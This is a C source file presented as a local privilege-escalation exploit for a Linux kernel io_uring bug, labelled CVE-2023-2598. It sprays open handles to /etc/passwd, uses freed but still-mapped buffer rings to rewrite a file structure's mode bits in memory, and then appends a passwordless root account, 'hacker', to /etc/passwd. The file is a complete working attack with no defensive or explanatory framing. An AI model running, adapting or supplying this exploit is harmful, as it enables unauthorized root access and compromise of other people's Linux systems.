#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <liburing.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>

#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include<sys/stat.h>
#include<sys/file.h>
#pragma pack(16)

#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_DEFAULT "\033[0m"
#define showAddr(var)  dprintf(2, COLOR_GREEN "[*] %s -> %p\n" COLOR_DEFAULT, #var, var);
#define logu(fmt, ...) dprintf(2,  "[*]  " fmt "\n" , ##__VA_ARGS__)
#define logd(fmt, ...) dprintf(2, COLOR_BLUE "[*] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
#define debug(fmt, ...)                      \
    do {                                     \
        loge(fmt, ##__VA_ARGS__);            \
        loge("debug at line %d", __LINE__);  \
        getchar();                           \
    } while (0)

#define check_ret(ret, buf) do { if((ret) < 0) { die(buf); } } while(0)
#define MAX_ring_entries 65536
#define PAGE_SZIE 0x1000
void bind_cpu(int core);
void binary_dump(char *desc, void *addr, int len);
struct __attribute__((aligned(0x100))) fake_filp{
    char pad[20];
    uint32_t f_mode;
    char padding[];
};

void prep_rlimit(int *nr_files){
    struct rlimit max_file;

    getrlimit(RLIMIT_NOFILE,&max_file);
    logu("rlim_cur -> %d rlim_max -> %d",max_file.rlim_cur,max_file.rlim_max);
    max_file.rlim_cur=max_file.rlim_max;
    setrlimit(RLIMIT_NOFILE,&max_file);

    int limit = max_file.rlim_max/4;
    *nr_files = limit/2;
    logu("nr_files -> %d",*nr_files);
}

int change_mode(void* addr,uint64_t size){
    int  ret = -1;
    uint64_t* tmp = (uint64_t* )addr;
    for (size_t i = 0; i < size/8; i++)
    {
        // if( tmp[i] != 0)
        //     logi(" addr: %p offset: 0x%llx -> %p",addr+i,i,tmp[i]);
        if(tmp[i]==0x494a801d00000000){
            // logw("successful!! addr: %p offset: 0x%llx -> %p",addr+i*8,i*8,tmp[i]);
            tmp[i] = 0x494f801f00000000;
            ret = 1;
            break;
        }
    }
    return ret;
}
int main(void){
    int nr_files,ret;
    struct io_uring ring;
    int nr_bufs = 1000;
    void** bufs;
    struct io_uring_buf_reg reg;
    int* fds;
    static struct stat status;
    int passwd_size,passwd_fd;
    char* hacker_buf;
    int hacker_len;
    uint64_t nr_pages,entries,mmap_size,mmap_off;
    RED;puts("[*] CVE-2023-2598 Exploit by mowen");CLOSE;

    stat("/etc/passwd",&status);
    passwd_size=status.st_size;
    logi("passwd_size -> %d",passwd_size);

    hacker_buf =(char*) malloc(passwd_size*2);
    passwd_fd = open("/etc/passwd",O_RDONLY);
    read(passwd_fd,hacker_buf,passwd_size);
    strcat(hacker_buf,"hacker::0:0:root:/root:/bin/sh\n");
    hacker_len =strlen(hacker_buf);

    bind_cpu(0);
// 1、解除当前进程限制
    prep_rlimit(&nr_files);
// 2、初始化 io_uring
    check_ret(io_uring_queue_init(32,&ring,0),"io_uring_queue_init fail");
    bufs = calloc(nr_bufs,sizeof(*bufs));
    fds = malloc(nr_files*(sizeof(int)));
    /**
     * nr_pages: 有多少页，构造页数
     * entries = nr_pages*(PAGE_SIZE/sizeof(struct io_uring_buf))
     * mmap_size = entries*sizeof(struct io_uring_buf);
     */
    entries = MAX_ring_entries/2;
    if(entries>MAX_ring_entries){
        die("entries too large");
    }
    nr_pages = entries/256;
    logi("nr_pages -> %d entries -> %d",nr_pages,entries);
// 3、注册 IOU_PBUF_RING_MMAP
    logu("register buf ring <- IOU_PBUF_RING_MMAP");

    for (size_t i = 0; i < nr_bufs; i++)
    {
        memset(&reg,0,sizeof(reg));
        reg.bgid=i;
        reg.flags=IOU_PBUF_RING_MMAP;
        reg.ring_entries=entries;
        ret=io_uring_register_buf_ring(&ring,&reg,0);
        if(ret < 0){
            die("io_uring_register_buf_ring fail [%d]",i);
        }
        mmap_size = reg.ring_entries*sizeof(struct io_uring_buf);
        mmap_off = IORING_OFF_PBUF_RING | (unsigned long long) i << IORING_OFF_PBUF_SHIFT;
        bufs[i] = mmap(
            NULL,
            mmap_size,
            PROT_READ|PROT_WRITE,
            MAP_SHARED,
            ring.ring_fd,
            mmap_off
        );
        if(bufs[i]==MAP_FAILED){
            die("mmap fail");
        }
        io_uring_buf_ring_init(bufs[i]);
        // logu("br[%d] -> %p",i,br[i]);
    }
    logu("unregister buf ring");
    for (size_t i = 0; i < nr_bufs; i++)
    {
        io_uring_unregister_buf_ring(&ring, i);
    }

    logi("sparying...");
    for (size_t i = 0; i < nr_files; i++)
    {
        fds[i] = open("/etc/passwd", O_RDONLY);
        check_ret(fds[i],"failed to open file");
    }
    logi("try to leak...");
    for (size_t i = 0; i < nr_bufs; i++)
    {
        ret = change_mode(bufs[i],PAGE_SZIE*nr_pages);
        if(ret<0)continue;
        logi("change_mode success!!!");

        for (size_t i = 0; i < nr_files; i++)
            {
                if(write(fds[i],hacker_buf,hacker_len)>0){
                    logw(" hacker /etc/passwd successful");
                    break;
                }
            }
        // debug("debug");
        stat("/etc/passwd",&status);
        logu("passwd_size -> %d",status.st_size);
        if(status.st_size==passwd_size)continue;
        logd("success!!! su hacker to get root");
        exit(0);
    }



    RED;puts("[*]failed");CLOSE;
    return 0;
}


void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    BLUE;printf("[*] bind_cpu(%d)",core);CLOSE;
}